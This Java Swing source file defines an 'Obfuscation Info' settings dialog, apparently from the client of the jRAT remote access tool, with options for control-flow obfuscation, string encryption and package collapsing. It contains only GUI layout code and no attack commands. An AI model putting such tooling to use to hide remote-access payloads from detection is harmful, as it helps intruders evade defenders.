package pro.jrat.client.ui.frames;

import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;

import pro.jrat.client.utils.Utils;

import com.redpois0n.zkmlib.types.EncryptStringLiterals;
import com.redpois0n.zkmlib.types.ExceptionObfuscation;
import com.redpois0n.zkmlib.types.ObfuscateFlow;

@SuppressWarnings("serial")
public class FrameObfuscationInfo extends BaseFrame {

	private JPanel contentPane;
	private JComboBox<ObfuscateFlow> cbObfuscate;
	private JComboBox<ExceptionObfuscation> cbExceptions;
	private JComboBox<EncryptStringLiterals> cbStrings;
	private JTextField txtPackageName;
	private JCheckBox chckbxCollapsePackages;

	public FrameObfuscationInfo() {
		setTitle("Obfuscation Info");
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameObfuscationInfo.class.getResource("/icons/block.png")));
		setResizable(false);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 300, 350);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		JLabel lblObfuscateFlow = new JLabel("Obfuscate Flow:");
		lblObfuscateFlow.setFont(new Font("Tahoma", Font.BOLD, 11));
		
		cbObfuscate = new JComboBox<ObfuscateFlow>(ObfuscateFlow.values());
		
		cbExceptions = new JComboBox<ExceptionObfuscation>(ExceptionObfuscation.values());
		
		cbStrings = new JComboBox<EncryptStringLiterals>(EncryptStringLiterals.values());
		
		
		JLabel lblExceptionObf = new JLabel("Exception Obf:");
		lblExceptionObf.setFont(new Font("Tahoma", Font.BOLD, 11));
		
		JLabel lblEncryptStrings = new JLabel("Encrypt Strings:");
		lblEncryptStrings.setFont(new Font("Tahoma", Font.BOLD, 11));
		
		chckbxCollapsePackages = new JCheckBox("Collapse Packages");
		chckbxCollapsePackages.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				txtPackageName.setEnabled(chckbxCollapsePackages.isSelected());
			}
		});
		chckbxCollapsePackages.setSelected(true);
		chckbxCollapsePackages.setFont(new Font("Tahoma", Font.BOLD, 11));
		
		txtPackageName = new JTextField();
		txtPackageName.setColumns(10);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(chckbxCollapsePackages)
							.addContainerGap())
						.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
							.addGroup(gl_contentPane.createSequentialGroup()
								.addComponent(lblEncryptStrings, GroupLayout.PREFERRED_SIZE, 103, GroupLayout.PREFERRED_SIZE)
								.addContainerGap())
							.addGroup(gl_contentPane.createSequentialGroup()
								.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
									.addComponent(lblExceptionObf, GroupLayout.PREFERRED_SIZE, 88, GroupLayout.PREFERRED_SIZE)
									.addComponent(lblObfuscateFlow))
								.addGap(14)
								.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
									.addComponent(cbObfuscate, Alignment.TRAILING, 0, 172, Short.MAX_VALUE)
									.addComponent(cbStrings, Alignment.TRAILING, 0, 172, Short.MAX_VALUE)
									.addComponent(cbExceptions, 0, 172, Short.MAX_VALUE)
									.addComponent(txtPackageName, GroupLayout.DEFAULT_SIZE, 172, Short.MAX_VALUE))))))
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(cbObfuscate, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblObfuscateFlow))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(cbExceptions, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblExceptionObf))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(cbStrings, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblEncryptStrings))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addComponent(chckbxCollapsePackages)
					.addGap(7)
					.addComponent(txtPackageName, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
					.addContainerGap(161, Short.MAX_VALUE))
		);
		contentPane.setLayout(gl_contentPane);
		
		setLocationRelativeTo(null);
		
		updatePackageName();
	}

	public void updatePackageName() {
		String random;
		
		do {
			random = Utils.randomString(5);
		} while (Character.isDigit(random.charAt(0)));
	}
}
